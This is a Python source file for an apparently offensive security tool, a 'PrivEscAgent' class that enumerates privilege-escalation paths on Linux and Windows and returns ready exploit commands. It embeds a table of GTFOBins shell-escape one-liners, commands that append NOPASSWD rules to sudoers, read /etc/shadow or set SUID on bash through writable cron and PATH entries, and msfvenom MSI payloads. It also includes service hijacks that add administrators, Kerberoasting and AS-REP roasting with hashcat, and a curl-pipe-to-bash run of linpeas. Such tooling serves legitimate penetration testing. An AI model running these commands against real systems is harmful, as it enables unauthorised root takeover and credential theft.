"""
PrivEscAgent — Privilege escalation enumeration and exploitation guide.
Linux: SUID, sudo, cron, capabilities, kernel exploits.
Windows: AlwaysInstallElevated, service perms, token impersonation, credentials.
"""
from __future__ import annotations

import asyncio
import json
import shutil
import uuid
from typing import Optional

import aiohttp

from core.tools.logger import get_logger

logger = get_logger("privesc_agent")

# Embedded GTFOBins subset for offline operation
_GTFOBINS_LOCAL: dict[str, dict] = {
    "find":     {"suid": "find . -exec /bin/sh -p \\; -quit", "sudo": "sudo find . -exec /bin/sh \\; -quit"},
    "vim":      {"suid": "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "sudo": "sudo vim -c ':!/bin/sh'"},
    "python":   {"sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'", "suid": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"},
    "python3":  {"sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"},
    "perl":     {"sudo": "sudo perl -e 'exec \"/bin/sh\";'", "suid": "perl -e 'use POSIX; setuid(0); exec \"/bin/sh\";'"},
    "ruby":     {"sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "nmap":     {"sudo": "sudo nmap --interactive", "suid": "nmap --interactive --script /etc/passwd"},
    "less":     {"sudo": "sudo less /etc/passwd  # then !/bin/sh"},
    "more":     {"sudo": "sudo more /etc/passwd  # then !/bin/sh"},
    "man":      {"sudo": "sudo man man  # then !/bin/sh"},
    "awk":      {"sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"},
    "bash":     {"suid": "bash -p", "sudo": "sudo bash"},
    "sh":       {"suid": "sh -p", "sudo": "sudo sh"},
    "cp":       {"sudo": "sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash; /tmp/bash -p"},
    "chmod":    {"sudo": "sudo chmod 4755 /bin/bash; /bin/bash -p"},
    "chown":    {"sudo": "sudo chown root:root /bin/bash; sudo chmod +s /bin/bash"},
    "dd":       {"sudo": "sudo dd if=/dev/stdin of=/etc/sudoers  # overwrite sudoers"},
    "tee":      {"sudo": "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers"},
    "cat":      {"sudo": "sudo cat /etc/shadow"},
    "curl":     {"sudo": "sudo curl file:///etc/shadow"},
    "wget":     {"sudo": "sudo wget -O /tmp/out file:///etc/shadow"},
    "tar":      {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "zip":      {"sudo": "sudo zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'"},
    "git":      {"sudo": "sudo git -p help config  # then !/bin/sh"},
    "nano":     {"sudo": "sudo nano  # Ctrl+R Ctrl+X  then reset; sh 1>&0 2>&0"},
    "gcc":      {"sudo": "sudo gcc -wrapper /bin/sh,-s ."},
    "docker":   {"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "lxc":      {"sudo": "sudo lxc init ubuntu:16.04 test -c security.privileged=true"},
    "strace":   {"sudo": "sudo strace -o /dev/null /bin/bash"},
    "ltrace":   {"sudo": "sudo ltrace /bin/sh"},
    "env":      {"suid": "env /bin/sh -p", "sudo": "sudo env /bin/sh"},
    "nice":     {"sudo": "sudo nice /bin/bash"},
    "timeout":  {"sudo": "sudo timeout 7d /bin/bash"},
    "watch":    {"sudo": "sudo watch -x /bin/sh"},
    "xargs":    {"sudo": "sudo xargs -a /dev/null sh"},
    "ed":       {"sudo": "sudo ed  # then !/bin/sh"},
    "pico":     {"sudo": "sudo pico  # Ctrl+R Ctrl+X  then reset; sh 1>&0 2>&0"},
    "mysql":    {"sudo": "sudo mysql -e '\\! /bin/sh'"},
    "ftp":      {"sudo": "sudo ftp  # then !/bin/sh"},
    "php":      {"sudo": "CMD='/bin/sh'; sudo php -r \"system('$CMD');\""},
    "node":     {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"},
    "socat":    {"sudo": "sudo socat stdin exec:/bin/sh"},
    "nc":       {"sudo": "sudo nc -e /bin/sh 127.0.0.1 4444"},
    "lua":      {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "tcpdump":  {"sudo": "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z ./payload.sh"},
    "openssl":  {"sudo": "sudo openssl req -x509 -newkey rsa:4096 -keyout /tmp/k -out /tmp/c -days 1 -nodes -subj '/CN=test'"},
    "rsync":    {"sudo": "sudo rsync -a /dev/null -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
    "scp":      {"sudo": "sudo scp -S /path/to/setuid/shell x y:"},
    "ssh":      {"sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    "screen":   {"suid": "screen -x root/root  # if root session exists"},
    "tmux":     {"sudo": "sudo tmux"},
}


class PrivEscAgent:
    """Privilege escalation enumeration and exploitation guide."""

    GTFOBINS_URL = "https://gtfobins.github.io/gtfobins/{binary}/"
    LOLBAS_URL   = "https://lolbas-project.github.io/api/lolbas.json"
    _TIMEOUT     = aiohttp.ClientTimeout(total=15)

    # ── Linux PrivEsc ─────────────────────────────────────────────────────────

    async def check_linux(self, target_ip: Optional[str] = None,
                          local_output: Optional[str] = None) -> dict:
        """
        Linux privesc checks. Runs locally or parses provided output.
        """
        results: dict = {
            "scan_id":       str(uuid.uuid4())[:8],
            "target":        target_ip or "local",
            "os_type":       "linux",
            "findings":      [],
            "high_risk":     [],
            "auto_exploitable": [],
            "status":        "running",
        }

        if local_output:
            findings = self._parse_linux_output(local_output)
        else:
            findings = await self._run_linux_checks_local()

        results["findings"]         = findings
        results["high_risk"]        = [f for f in findings if f.get("risk") in ("HIGH", "CRITICAL")]
        results["auto_exploitable"] = [f for f in findings if f.get("exploitable")]
        results["high_risk_count"]  = len(results["high_risk"])
        results["medium_risk_count"] = len([f for f in findings if f.get("risk") == "MEDIUM"])
        results["status"]           = "completed"

        return results

    async def _run_linux_checks_local(self) -> list:
        """Execute local Linux enumeration commands."""
        findings = []

        checks = [
            ("suid", self._check_suid_bins),
            ("sudo",   self._check_sudo_l),
            ("cron",   self._check_cron),
            ("caps",   self._check_capabilities),
            ("kernel", self._check_kernel_version),
            ("world_writable", self._check_world_writable),
            ("path",   self._check_path_injection),
            ("nfs",    self._check_nfs),
        ]

        for name, fn in checks:
            try:
                result = await fn()
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
            except Exception as e:
                logger.debug(f"Linux check {name} failed: {e}")

        return findings

    async def _check_suid_bins(self) -> list:
        findings = []
        try:
            proc = await asyncio.create_subprocess_exec(
                "find", "/", "-type", "f", "-perm", "-4000", "-not", "-path", "*/proc/*",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
            bins = stdout.decode(errors="replace").strip().splitlines()

            for binary_path in bins:
                binary_name = binary_path.strip().split("/")[-1]
                if binary_name in _GTFOBINS_LOCAL:
                    gtfo = _GTFOBINS_LOCAL[binary_name]
                    exploit_cmd = gtfo.get("suid", "")
                    findings.append({
                        "category":     "SUID",
                        "title":        f"Exploitable SUID binary: {binary_path.strip()}",
                        "description":  f"{binary_name} is SUID and has a GTFOBins exploit",
                        "binary":       binary_path.strip(),
                        "risk":         "HIGH",
                        "exploitable":  True,
                        "exploit_cmd":  exploit_cmd,
                        "reference":    f"https://gtfobins.github.io/gtfobins/{binary_name}/",
                    })
                else:
                    findings.append({
                        "category":    "SUID",
                        "title":       f"SUID binary: {binary_path.strip()}",
                        "description": "SUID binary — review if necessary",
                        "binary":      binary_path.strip(),
                        "risk":        "MEDIUM",
                        "exploitable": False,
                    })
        except Exception as e:
            logger.debug(f"SUID check failed: {e}")
        return findings

    async def _check_sudo_l(self) -> list:
        findings = []
        sudo_bin = shutil.which("sudo")
        if not sudo_bin:
            return findings

        try:
            proc = await asyncio.create_subprocess_exec(
                sudo_bin, "-l", "-n",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
            out = stdout.decode(errors="replace") + stderr.decode(errors="replace")

            if "NOPASSWD" in out:
                for line in out.splitlines():
                    if "NOPASSWD" in line:
                        for binary_name, gtfo in _GTFOBINS_LOCAL.items():
                            if binary_name in line.lower():
                                findings.append({
                                    "category":    "SUDO",
                                    "title":       f"NOPASSWD sudo for {binary_name}",
                                    "description": f"sudo rule: {line.strip()}",
                                    "risk":        "CRITICAL",
                                    "exploitable": True,
                                    "exploit_cmd": gtfo.get("sudo", ""),
                                    "sudo_line":   line.strip(),
                                    "reference":   f"https://gtfobins.github.io/gtfobins/{binary_name}/",
                                })
                                break

            if "(ALL)" in out or "(ALL : ALL)" in out:
                findings.append({
                    "category":    "SUDO",
                    "title":       "Full sudo privileges",
                    "description": "User has full sudo — can run any command as root",
                    "risk":        "CRITICAL",
                    "exploitable": True,
                    "exploit_cmd": "sudo su - OR sudo /bin/bash",
                })
        except Exception as e:
            logger.debug(f"sudo -l failed: {e}")

        return findings

    async def _check_cron(self) -> list:
        findings = []
        cron_paths = [
            "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
            "/etc/cron.weekly", "/etc/crontab", "/var/spool/cron",
        ]
        import os
        for cron_path in cron_paths:
            try:
                if os.path.isfile(cron_path):
                    stat = os.stat(cron_path)
                    if stat.st_mode & 0o002:  # world-writable
                        findings.append({
                            "category":    "CRON",
                            "title":       f"World-writable cron file: {cron_path}",
                            "risk":        "CRITICAL",
                            "exploitable": True,
                            "exploit_cmd": f"echo 'chmod 4755 /bin/bash' >> {cron_path}",
                        })
                elif os.path.isdir(cron_path):
                    for fname in os.listdir(cron_path):
                        fpath = os.path.join(cron_path, fname)
                        stat = os.stat(fpath)
                        if stat.st_mode & 0o002:
                            findings.append({
                                "category":    "CRON",
                                "title":       f"World-writable cron file: {fpath}",
                                "risk":        "CRITICAL",
                                "exploitable": True,
                                "exploit_cmd": f"echo 'chmod 4755 /bin/bash' >> {fpath}",
                            })
            except Exception:
                pass
        return findings

    async def _check_capabilities(self) -> list:
        findings = []
        getcap_bin = shutil.which("getcap")
        if not getcap_bin:
            return findings

        try:
            proc = await asyncio.create_subprocess_exec(
                getcap_bin, "-r", "/",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
            out = stdout.decode(errors="replace").strip()

            dangerous_caps = ["cap_setuid", "cap_sys_admin", "cap_sys_ptrace", "cap_net_raw"]
            for line in out.splitlines():
                for cap in dangerous_caps:
                    if cap in line.lower():
                        binary_path = line.split(" ")[0]
                        binary_name = binary_path.split("/")[-1].lower()
                        findings.append({
                            "category":    "CAPABILITIES",
                            "title":       f"Dangerous capability on {binary_name}: {cap}",
                            "description": line.strip(),
                            "binary":      binary_path,
                            "capability":  cap,
                            "risk":        "HIGH",
                            "exploitable": cap in ("cap_setuid", "cap_sys_admin"),
                            "exploit_cmd": f"# Use {binary_name} with {cap} to escalate privileges",
                        })
        except Exception as e:
            logger.debug(f"getcap failed: {e}")

        return findings

    async def _check_kernel_version(self) -> list:
        findings = []
        try:
            proc = await asyncio.create_subprocess_exec(
                "uname", "-r",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            kernel = stdout.decode(errors="replace").strip()

            findings.append({
                "category":    "KERNEL",
                "title":       f"Kernel version: {kernel}",
                "description": f"Check searchsploit for kernel exploits: searchsploit linux kernel {kernel[:10]}",
                "risk":        "MEDIUM",
                "exploitable": False,
                "kernel_version": kernel,
                "note":        "Run: searchsploit linux kernel privilege escalation",
            })
        except Exception:
            pass
        return findings

    async def _check_world_writable(self) -> list:
        findings = []
        try:
            proc = await asyncio.create_subprocess_exec(
                "find", "/etc", "/usr/local", "/opt", "-writable", "-not", "-path", "*/proc/*",
                "-type", "f",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
            files = stdout.decode(errors="replace").strip().splitlines()

            for f in files[:20]:
                f = f.strip()
                if f:
                    findings.append({
                        "category":    "WRITABLE",
                        "title":       f"World-writable sensitive file: {f}",
                        "risk":        "HIGH",
                        "exploitable": True,
                        "exploit_cmd": f"echo 'malicious content' >> {f}",
                    })
        except Exception:
            pass
        return findings

    async def _check_path_injection(self) -> list:
        findings = []
        import os
        path_env = os.environ.get("PATH", "")
        for p in path_env.split(":"):
            if p in (".", "", "./"):
                findings.append({
                    "category":    "PATH",
                    "title":       "Current directory in PATH — PATH injection possible",
                    "description": f"PATH contains '{p}' — create malicious binary with same name as privileged command",
                    "risk":        "HIGH",
                    "exploitable": True,
                    "exploit_cmd": "echo '#!/bin/bash\nchmod 4755 /bin/bash' > /writable/path/command && chmod +x ...",
                })
        return findings

    async def _check_nfs(self) -> list:
        findings = []
        nfs_conf = "/etc/exports"
        import os
        if not os.path.exists(nfs_conf):
            return findings
        try:
            content = open(nfs_conf).read()
            if "no_root_squash" in content:
                findings.append({
                    "category":    "NFS",
                    "title":       "NFS root_squash disabled",
                    "description": "NFS export without root_squash allows root privilege escalation from client",
                    "risk":        "CRITICAL",
                    "exploitable": True,
                    "exploit_cmd": "# Mount NFS share, copy /bin/bash, chmod +s — execute as root",
                })
        except Exception:
            pass
        return findings

    def _parse_linux_output(self, output: str) -> list:
        """Parse provided command output (from remote host)."""
        findings = []
        lines = output.splitlines()

        for line in lines:
            line_l = line.lower()
            if "suid" in line_l and "/" in line:
                binary_name = line.strip().split("/")[-1]
                if binary_name in _GTFOBINS_LOCAL:
                    findings.append({
                        "category":    "SUID",
                        "title":       f"Exploitable SUID: {line.strip()}",
                        "risk":        "HIGH",
                        "exploitable": True,
                        "exploit_cmd": _GTFOBINS_LOCAL[binary_name].get("suid", ""),
                    })

            if "nopasswd" in line_l:
                findings.append({
                    "category":    "SUDO",
                    "title":       f"NOPASSWD sudo: {line.strip()}",
                    "risk":        "CRITICAL",
                    "exploitable": True,
                    "exploit_cmd": "sudo <command>",
                })

            if "no_root_squash" in line_l:
                findings.append({
                    "category": "NFS",
                    "title":    "NFS no_root_squash",
                    "risk":     "CRITICAL",
                    "exploitable": True,
                    "exploit_cmd": "Mount NFS and copy SUID shell",
                })

        return findings

    # ── Windows PrivEsc ───────────────────────────────────────────────────────

    async def check_windows(self, target_ip: Optional[str] = None,
                             local_output: Optional[str] = None) -> dict:
        """Windows privilege escalation checks."""
        results: dict = {
            "scan_id":           str(uuid.uuid4())[:8],
            "target":            target_ip or "local",
            "os_type":           "windows",
            "findings":          [],
            "high_risk":         [],
            "auto_exploitable":  [],
            "status":            "running",
        }

        if local_output:
            findings = self._parse_windows_output(local_output)
        else:
            findings = self._get_windows_checks_template()

        results["findings"]          = findings
        results["high_risk"]         = [f for f in findings if f.get("risk") in ("HIGH", "CRITICAL")]
        results["auto_exploitable"]  = [f for f in findings if f.get("exploitable")]
        results["high_risk_count"]   = len(results["high_risk"])
        results["medium_risk_count"] = len([f for f in findings if f.get("risk") == "MEDIUM"])
        results["status"]            = "completed"

        return results

    def _get_windows_checks_template(self) -> list:
        """Return Windows privesc check commands to run on the target."""
        return [
            {
                "category":    "REGISTRY",
                "title":       "AlwaysInstallElevated check",
                "description": "Run: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "risk":        "CRITICAL",
                "check_cmd":   "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "exploit_cmd": "msfvenom -p windows/exec CMD=whoami -f msi > evil.msi && msiexec /quiet /qn /i evil.msi",
                "exploitable": False,
            },
            {
                "category":    "SERVICE",
                "title":       "Unquoted service paths",
                "description": "Run: wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v c:\\windows\\",
                "risk":        "HIGH",
                "check_cmd":   "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v c:\\windows\\",
                "exploit_cmd": "Place malicious exe in unquoted path component",
                "exploitable": False,
            },
            {
                "category":    "SERVICE",
                "title":       "Weak service permissions",
                "description": "Run: accesschk64.exe -uwcqv * /accepteula",
                "risk":        "HIGH",
                "check_cmd":   "accesschk64.exe -uwcqv * /accepteula 2>nul",
                "exploit_cmd": "sc config <service> binPath= 'cmd /c net localgroup administrators <user> /add'",
                "exploitable": False,
            },
            {
                "category":    "TOKEN",
                "title":       "Token impersonation privileges",
                "description": "Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
                "risk":        "CRITICAL",
                "check_cmd":   "whoami /priv",
                "exploit_cmd": "Use PrintSpoofer or RoguePotato for token impersonation",
                "exploitable": False,
            },
            {
                "category":    "CREDENTIAL",
                "title":       "Credentials in registry (AutoLogon)",
                "description": "Check for plaintext credentials in WinLogon keys",
                "risk":        "HIGH",
                "check_cmd":   "reg query HKLM /f password /t REG_SZ /s | findstr /i password",
                "exploit_cmd": "Use discovered credentials for lateral movement",
                "exploitable": False,
            },
            {
                "category":    "TASK",
                "title":       "Scheduled tasks with weak permissions",
                "description": "Check for scheduled tasks running as SYSTEM with modifiable scripts",
                "risk":        "HIGH",
                "check_cmd":   "schtasks /query /fo LIST /v | findstr /i 'task name run as'",
                "exploit_cmd": "Replace task binary/script with malicious payload",
                "exploitable": False,
            },
            {
                "category":    "DLL",
                "title":       "DLL hijacking opportunities",
                "description": "Check for missing DLLs in writable directories",
                "risk":        "HIGH",
                "check_cmd":   "Procmon filter: DLL Not Found in writable paths",
                "exploit_cmd": "Place malicious DLL in search path location",
                "exploitable": False,
            },
            {
                "category":    "KERBEROS",
                "title":       "Kerberoastable service accounts",
                "description": "Get SPNs: setspn -T <domain> -Q */*",
                "risk":        "HIGH",
                "check_cmd":   "setspn -T DOMAIN -Q */* | findstr CN",
                "exploit_cmd": "Invoke-Kerberoast -OutputFormat HashCat | Out-File kerb.txt && hashcat -m 13100",
                "exploitable": False,
            },
            {
                "category":    "KERBEROS",
                "title":       "AS-REP Roasting candidates",
                "description": "Users with UF_DONT_REQUIRE_PREAUTH",
                "risk":        "HIGH",
                "check_cmd":   "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth",
                "exploit_cmd": "Rubeus.exe asreproast /format:hashcat | hashcat -m 18200",
                "exploitable": False,
            },
        ]

    def _parse_windows_output(self, output: str) -> list:
        """Parse Windows command output for privilege escalation indicators."""
        findings = []
        output_l = output.lower()

        if "alwaysinstallelevated" in output_l and "0x1" in output:
            findings.append({
                "category":    "REGISTRY",
                "title":       "AlwaysInstallElevated is enabled",
                "risk":        "CRITICAL",
                "exploitable": True,
                "exploit_cmd": "msfvenom -p windows/exec CMD=cmd -f msi > evil.msi && msiexec /quiet /qn /i evil.msi",
            })

        if "seimpersonateprivilege" in output_l and "enabled" in output_l:
            findings.append({
                "category":    "TOKEN",
                "title":       "SeImpersonatePrivilege is enabled",
                "risk":        "CRITICAL",
                "exploitable": True,
                "exploit_cmd": "PrintSpoofer64.exe -i -c powershell.exe  OR  RoguePotato.exe",
            })

        if "seassignprimarytokenprivilege" in output_l and "enabled" in output_l:
            findings.append({
                "category":    "TOKEN",
                "title":       "SeAssignPrimaryTokenPrivilege is enabled",
                "risk":        "CRITICAL",
                "exploitable": True,
                "exploit_cmd": "JuicyPotato.exe or PrintSpoofer for token impersonation",
            })

        if "defaultpassword" in output_l or "autologon" in output_l:
            findings.append({
                "category":    "CREDENTIAL",
                "title":       "Possible AutoLogon credentials in registry",
                "risk":        "HIGH",
                "exploitable": True,
                "exploit_cmd": "Use credentials for lateral movement or privilege escalation",
            })

        return findings

    # ── GTFOBins ──────────────────────────────────────────────────────────────

    async def get_gtfobins(self, binary: str) -> dict:
        """GTFOBins lookup for a specific binary (local cache + web)."""
        binary_lower = binary.lower().strip()

        # Local cache first
        if binary_lower in _GTFOBINS_LOCAL:
            return {
                "binary":    binary_lower,
                "found":     True,
                "source":    "local_cache",
                "functions": _GTFOBINS_LOCAL[binary_lower],
                "url":       self.GTFOBINS_URL.format(binary=binary_lower),
            }

        # Try web lookup
        try:
            url = self.GTFOBINS_URL.format(binary=binary_lower)
            async with aiohttp.ClientSession(timeout=self._TIMEOUT) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        html = await resp.text()
                        # Parse function names from HTML
                        import re
                        funcs = re.findall(r'<h2\s+[^>]*id="([^"]+)"', html)
                        return {
                            "binary":    binary_lower,
                            "found":     True,
                            "source":    "web",
                            "functions": {f: f"See {url}#{f}" for f in funcs},
                            "url":       url,
                        }
                    else:
                        return {
                            "binary": binary_lower,
                            "found":  False,
                            "source": "web",
                            "note":   f"HTTP {resp.status} — binary may not have GTFOBins entry",
                        }
        except Exception as e:
            return {
                "binary": binary_lower,
                "found":  False,
                "error":  str(e),
                "note":   "Network lookup failed",
            }

    # ── LinPEAS ───────────────────────────────────────────────────────────────

    async def run_linpeas(self, target_ip: str, ssh_creds: Optional[dict] = None) -> dict:
        """Download and run linpeas.sh, parse output."""
        result: dict = {
            "target":  target_ip,
            "status":  "not_run",
            "output":  "",
            "findings": [],
        }

        linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"

        if not shutil.which("wget") and not shutil.which("curl"):
            result["status"]  = "download_tool_missing"
            result["message"] = "wget or curl required to download linpeas.sh"
            return result

        if target_ip in ("localhost", "127.0.0.1", "local"):
            # Download and run locally
            import tempfile, os
            tmpfile = tempfile.mktemp(suffix=".sh")
            try:
                # Download
                dl_cmd = (
                    ["curl", "-sL", linpeas_url, "-o", tmpfile]
                    if shutil.which("curl")
                    else ["wget", "-q", linpeas_url, "-O", tmpfile]
                )
                proc = await asyncio.create_subprocess_exec(
                    *dl_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await asyncio.wait_for(proc.communicate(), timeout=30)

                if not os.path.exists(tmpfile):
                    result["status"]  = "download_failed"
                    return result

                os.chmod(tmpfile, 0o755)
                proc = await asyncio.create_subprocess_exec(
                    "bash", tmpfile, "-a",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    env={**__import__("os").environ, "TERM": "dumb"},
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
                output = stdout.decode(errors="replace")
                result["output"]  = output[:10000]
                result["status"]  = "completed"
                result["findings"] = self._parse_linpeas_output(output)

            except asyncio.TimeoutError:
                result["status"] = "timeout"
            except Exception as e:
                result["status"] = "error"
                result["error"]  = str(e)
            finally:
                try:
                    os.unlink(tmpfile)
                except Exception:
                    pass
        else:
            result["status"]  = "remote_not_implemented"
            result["message"] = (
                f"Remote linpeas via SSH to {target_ip} — "
                "provide ssh_creds with host/user/password/key_file for remote execution"
            )
            result["manual_cmd"] = (
                f"ssh user@{target_ip} 'curl -sL {linpeas_url} | bash'"
            )

        return result

    def _parse_linpeas_output(self, output: str) -> list:
        """Parse linpeas output for HIGH/CRITICAL findings."""
        findings = []
        for line in output.splitlines():
            # linpeas uses ANSI color codes; strip them
            import re
            clean = re.sub(r"\033\[[0-9;]*m", "", line).strip()
            if not clean:
                continue
            # Look for high-severity markers
            if "99%" in clean or "95%" in clean or "interesting" in clean.lower():
                findings.append({
                    "category":    "LINPEAS",
                    "title":       clean[:200],
                    "risk":        "HIGH",
                    "exploitable": False,
                })
        return findings[:50]

    # ── WinPEAS ───────────────────────────────────────────────────────────────

    async def run_winpeas(self, target_ip: str, smb_creds: Optional[dict] = None) -> dict:
        """Upload and run winPEAS, parse output."""
        return {
            "target":  target_ip,
            "status":  "remote_not_implemented",
            "message": (
                "WinPEAS remote execution via SMB/PSExec — "
                "provide smb_creds with user/password for automatic execution"
            ),
            "manual_cmd": (
                f"# Upload winpeas.exe to target then run:\n"
                f"winPEASx64.exe all > c:\\temp\\winpeas_output.txt\n"
                f"# Download and parse: POST /api/privesc/windows with local_output=<content>"
            ),
            "download_url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
        }

    # ── Auto exploit SUID ─────────────────────────────────────────────────────

    async def auto_exploit_suid(self, binary: str, gtfo_data: dict) -> dict:
        """Auto-generate exploit commands for SUID binary from GTFOBins."""
        binary_lower = binary.lower().strip()
        functions    = gtfo_data.get("functions", {})
        exploit_cmd  = functions.get("suid", functions.get("sudo", ""))

        return {
            "binary":      binary_lower,
            "exploit_cmd": exploit_cmd,
            "type":        "SUID" if "suid" in functions else "SUDO",
            "notes":       [
                f"Ensure {binary_lower} is SUID (ls -la $(which {binary_lower}))",
                "Test in isolated environment before production use",
                f"Reference: https://gtfobins.github.io/gtfobins/{binary_lower}/",
            ],
            "one_liner": exploit_cmd.split("\n")[0] if exploit_cmd else "No exploit available",
        }
